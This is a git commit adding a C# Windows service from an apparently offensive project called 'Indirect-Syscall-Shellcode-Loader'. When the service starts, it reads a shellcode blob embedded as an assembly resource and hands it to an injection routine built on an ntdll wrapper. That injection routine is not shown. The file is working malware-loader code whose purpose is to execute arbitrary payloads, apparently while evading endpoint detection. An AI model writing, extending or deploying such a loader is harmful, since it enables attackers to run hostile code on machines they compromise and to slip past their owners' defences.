462ab60938c36435ec458c5269d0201105f153a2
susMdT <68256613+susMdT@users.noreply.github.com>
2023-01-09 17:09:22 -0500

    Add files via upload

---
+++ Indirect-Syscall-Shellcode-Loader/Service/Program.cs
@@ -0,0 +1,52 @@
+﻿using System;
+using System.ServiceProcess;
+using System.Runtime.InteropServices;
+//using System.Threading;
+using System.Diagnostics;
+using System.Text;
+using System.Net;
+using System.Timers;
+using System.Reflection;
+using System.Linq;
+using System.Runtime.CompilerServices;
+using System.IO;
+namespace Jit_Tripping
+{
+    class WinService : ServiceBase
+    {
+        public const string _ServiceName = "doesntmatter";
+
+        static void Main(string[] args)
+        {
+            Run(new WinService());
+        }
+
+        public WinService()
+        {
+            ServiceName = _ServiceName;
+        }
+
+        protected override void OnStart(string[] args)
+        {
+            dll ntdll = new dll();
+            byte[] bytes = new byte[] {};
+            string [] resource_names = Assembly.GetExecutingAssembly().GetManifestResourceNames();
+
+            if (resource_names.Contains("Jit_Tripping.shellcode"))
+            {
+                var ms = new MemoryStream();
+                Stream resStream = Assembly.GetExecutingAssembly().GetManifestResourceStream("Jit_Tripping.shellcode");
+                resStream.CopyTo(ms);
+                bytes = ms.ToArray();
+            } 
+
+            Utils.inject(bytes, ntdll);
+        }
+
+        protected override void OnStop()
+        {
+            base.OnStop();
+        }
+    }
+}
+
